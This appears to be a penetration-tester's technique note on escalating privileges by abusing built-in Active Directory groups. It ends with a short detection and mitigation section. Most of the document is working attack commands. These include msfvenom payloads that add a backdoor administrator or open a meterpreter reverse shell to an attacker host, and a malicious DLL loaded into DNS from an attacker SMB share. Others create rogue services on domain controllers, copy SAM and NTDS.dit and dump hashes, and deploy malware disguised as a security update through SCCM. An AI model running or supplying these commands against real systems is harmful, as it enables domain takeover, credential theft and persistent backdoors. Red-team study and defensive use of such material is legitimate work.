---
tags:
  - "#type/technique"
  - "#tactic/TA0004"
  - "#technique/T1078.002"
  - "#stage/privilege-escalation"
  - "#os/windows"
  - "#os/linux"
  - "#tool/powerview"
  - "#tool/bloodhound"
  - "#tool/msfvenom"
  - "#tool/impacket"
aliases:
  - Privileged Group Abuse
  - Active Directory Group Exploitation
  - Group Membership Attacks
  - Built-in Group Abuse
  - DnsAdmins
  - Server Operators
  - Print Operators
  - Backup Operators
  - Account Operators
  - Event Log Readers
---

## Technique
___

Many built-in and custom Active Directory groups have powerful privileges that can be leveraged for privilege escalation. This technique involves exploiting group membership to escalate privileges, often to domain administrator or equivalent. The specific methods vary by group but typically involve abusing legitimate functionalities or permissions granted to these groups.

## Prerequisites
___

**Access Level:** Membership in one of the targeted privileged groups

**System State:** Active Directory environment

**Tools:** PowerView, BloodHound, dnscmd, sc, msfvenom, impacket, other group-specific utilities

## Execution
___

### DnsAdmins Group Abuse

> [!WARNING]
> This attack loads a DLL into the DNS service. This can cause the DNS service to crash if implemented incorrectly. Always test in a controlled environment.

DnsAdmins group members can load arbitrary DLLs with SYSTEM privileges on the DNS server:

1. Create a malicious DLL with msfvenom:
```bash
msfvenom -p windows/x64/exec CMD='net user hacker Password123! /add && net localgroup administrators hacker /add' -f dll > dns.dll
```

2. Host the DLL on an SMB share:

**Windows:**
```powershell
# On the attacker machine
New-SmbShare -Name "share" -Path "C:\Tools" -FullAccess Everyone
```

**Linux:**
```bash
# On the attacker machine
mkdir /tmp/share
cp dns.dll /tmp/share/
impacket-smbserver share /tmp/share -smb2support
```

3. Configure the DNS server to load your DLL:
```powershell
# From a DnsAdmins account
dnscmd.exe /config /serverlevelplugindll \\ATTACKER\share\dns.dll

# Or via WMI
$dnsserver = Get-WmiObject -Namespace "root\microsoftdns" -Class "microsoftdns_server" -ComputerName "dc.domain.local"
$dnsserver.serverlevelplugindll = "\\ATTACKER\share\dns.dll"
$dnsserver.Put()
```

4. Restart the DNS service:
```powershell
# From Windows
sc.exe \\dc.domain.local stop dns
sc.exe \\dc.domain.local start dns

# From Linux (using impacket)
impacket-wmiexec domain/user:password@dc.domain.local "sc stop dns"
impacket-wmiexec domain/user:password@dc.domain.local "sc start dns"
```

### Server Operators Group Abuse

Server Operators can start/stop services and log on locally to domain controllers:

**Windows:**
```powershell
# Stop a service
sc.exe \\dc.domain.local stop "Service Name"

# Create and start a malicious service
sc.exe \\dc.domain.local create HackSvc binpath= "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
sc.exe \\dc.domain.local start HackSvc
```

**Linux:**
```bash
# Using impacket
impacket-wmiexec domain/serveroperator:password@dc.domain.local "sc stop \"Service Name\""

# Create and start a malicious service
impacket-wmiexec domain/serveroperator:password@dc.domain.local "sc create HackSvc binpath= \"cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add\""
impacket-wmiexec domain/serveroperator:password@dc.domain.local "sc start HackSvc"
```

Alternatively, replace service binaries while the service is stopped (requires write access to the binary location).

### Print Operators Group Abuse

Print Operators can add printers and manage print queues, but crucially, they have the SeLoadDriverPrivilege privilege:

1. Create a malicious driver with msfvenom:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f dll > malicious_driver.dll
```

2. Load the driver using the SeLoadDriverPrivilege:
```powershell
# Using Priv2Admin tool
.\Priv2Admin.exe SeLoadDriverPrivilege "\\path\to\malicious\driver"
```

Print Operators can also add printer drivers which can be exploited for DLL injection.

### Backup Operators Group Abuse

Backup Operators have the ability to read any file on the system, bypassing standard access controls:

**Windows:**
1. Access sensitive files using volume shadow copies:
```powershell
# Create a shadow copy
vssadmin create shadow /for=C:

# Access the SAM and SYSTEM hives
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\

# Extract credentials with mimikatz or similar tools
```

2. Alternatively, use the Diskshadow utility:
```
diskshadow> set context persistent nowriters
diskshadow> add volume c: alias temp
diskshadow> create
diskshadow> expose %temp% z:
diskshadow> exec "cmd.exe" /c copy z:\Windows\NTDS\ntds.dit C:\Temp\
```

**Linux:**
```bash
# Using CrackMapExec to dump SAM once you have access to the files
# Assuming you've transferred the files to your Linux machine
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Using secretsdump directly against a DC (if you have credentials)
impacket-secretsdump -just-dc domain/backupoperator:password@dc.domain.local
```

### Account Operators Group Abuse

Account Operators can create and manage user accounts and groups but not in the Domain Admins or other protected groups:

**Windows:**
```powershell
# Create a new user
New-ADUser -Name "HackerUser" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true

# Add to a group with useful permissions
Add-ADGroupMember -Identity "ServerAdmins" -Members "HackerUser"

# Alternative using net commands
net user HackerUser Password123! /add /domain
net group "ServerAdmins" HackerUser /add /domain
```

**Linux:**
```bash
# Using impacket
impacket-adduser domain/accountoperator:password@dc.domain.local HackerUser Password123!

# Using netexec
nxc ldap dc.domain.local -u accountoperator -p password --add-user HackerUser --password Password123!

# Add to a group
nxc ldap dc.domain.local -u accountoperator -p password --add-groupmember "ServerAdmins" HackerUser
```

### Event Log Readers Group Abuse

Event Log Readers can access event logs, which may contain sensitive information:

**Windows:**
```powershell
# Extract information from event logs
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | Select-Object -First 10

# Look for passwords in logs
Get-WinEvent -LogName * | Select-Object LogName | Sort-Object LogName -Unique
Get-WinEvent -LogName Application | Where-Object {$_.Message -like "*password*"}
```

**Linux:**
```bash
# Using Windows Remote Management
evil-winrm -i dc.domain.local -u eventlogreader -p password -s /path/to/scripts

# Within evil-winrm session
PS> Get-EventLog -LogName Security -Newest 10
PS> Get-WinEvent -LogName Application | Where-Object {$_.Message -match "password"}
```

This information can be used for credential hunting and lateral movement.

### Hyper-V Administrators Group Abuse

Members of this group have complete control over Hyper-V:

**Windows:**
```powershell
# Access the host's disk from a VM
# Create a configuration file that maps the host's disk to the VM
Set-VMHardDiskDrive -VMName "TargetVM" -ControllerType SCSI -ControllerNumber 0 -Path "\\.\PhysicalDrive0"

# Access SAM and SYSTEM files from the host
```

### SCCM Administrators Group Abuse

SCCM (System Center Configuration Manager) admins can deploy software to any machine in the environment:

1. Create a malicious application package:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe > malicious.exe
```

2. Push the application to targeted systems using SCCM's infrastructure or PowerShell:

**Windows:**
```powershell
# Using ConfigMgr PowerShell module
Import-Module ConfigurationManager
New-CMApplication -Name "Security Update" -Description "Critical security update"
# Continue with application deployment steps
```

### Exchange Server Group Abuse

Exchange privileged groups (Organization Management, Exchange Trusted Subsystem) have elevated permissions in AD:

**Windows:**
```powershell
# Abuse Exchange Windows Permissions
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members "HackerUser"

# Use WriteDACL to modify domain permissions
# Can lead to DCSync capability
```

**Linux:**
```bash
# If you have compromised an Exchange account, check for ACL-based attack paths
bloodhound-python -d domain.local -u exchangeuser -p password -c all -ns 10.10.10.10
```

### Remote Management Users Group Abuse

Members can log in via WinRM/PSRemoting:

**Windows:**
```powershell
# Once authenticated via WinRM, look for lateral movement opportunities
Enter-PSSession -ComputerName "targetserver.domain.local" -Credential (Get-Credential)

# Check local privileges and look for misconfigured services
Get-Service | Where-Object {$_.Status -eq "Running"}
```

**Linux:**
```bash
# Using evil-winrm
evil-winrm -i targetserver.domain.local -u remoteuser -p password

# Using CrackMapExec
nxc winrm targetserver.domain.local -u remoteuser -p password -x "whoami /all"
```

### Certificate Service DCOM Group Abuse

Members can enroll for certificates and potentially abuse ESC vulnerabilities:

**Windows:**
```powershell
# Enumerate certificate templates
certutil -template

# Request certificates using techniques from ADCS vulnerabilities section
# See ADCS vulnerabilities note for details
```

**Linux:**
```bash
# Using Certipy for ADCS exploitation
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10
```

### Schema Admins Group Abuse

Schema Admins can modify the domain schema, creating backdoors:

**Windows:**
```powershell
# Create a backdoor using schemaUpdates
# This is an advanced technique requiring custom PowerShell/LDAP manipulation
```

**Linux:**
```bash
# Using ldapmodify for schema changes
ldapmodify -H ldap://dc.domain.local -D "cn=schemaadmin,cn=users,dc=domain,dc=local" -w password -f schema_changes.ldif
```

## Detection & Mitigation
___

### Detection

- Monitor for changes to privileged group membership
- Watch for unusual service creation or modification on domain controllers
- Monitor for DLL loading in sensitive processes like DNS
- Look for access to critical files like NTDS.dit outside normal backup operations
- Alert on new scheduled tasks or services on domain controllers
- Monitor use of administrative tools on unexpected systems

### Mitigation

**General Mitigations:**
- Apply the principle of least privilege to all group memberships
- Regularly audit group memberships, especially for built-in privileged groups
- Implement time-based, just-in-time administration for privileged groups
- Use Protected Users security group for privileged accounts
- Enable Privileged Access Management in Active Directory
- Implement tiered administration model

**Group-Specific Mitigations:**

**DnsAdmins:**
- Monitor DNS service configurations
- Restrict who can restart the DNS service
- Consider using AppLocker or similar to restrict DLL loading

**Server Operators:**
- Restrict service management capabilities
- Use secure service configurations that can't be easily exploited
- Implement proper ACLs on service executables

**Print Operators:**
- Restrict driver installation capabilities
- Monitor for new printer drivers
- Consider removing SeLoadDriverPrivilege

**Backup Operators:**
- Restrict physical and remote access to domain controllers
- Monitor for creation of shadow copies
- Audit file access on sensitive locations

**Account Operators:**
- Carefully review which groups this group can modify
- Implement proper ACLs on sensitive groups
- Monitor for new account creation

**SCCM Admins:**
- Implement approval workflows for software deployment
- Audit SCCM actions regularly
- Separate SCCM admin accounts from regular accounts

**Exchange Groups:**
- Monitor Exchange server permissions
- Regularly audit Exchange-related group memberships
- Consider implementing split permissions model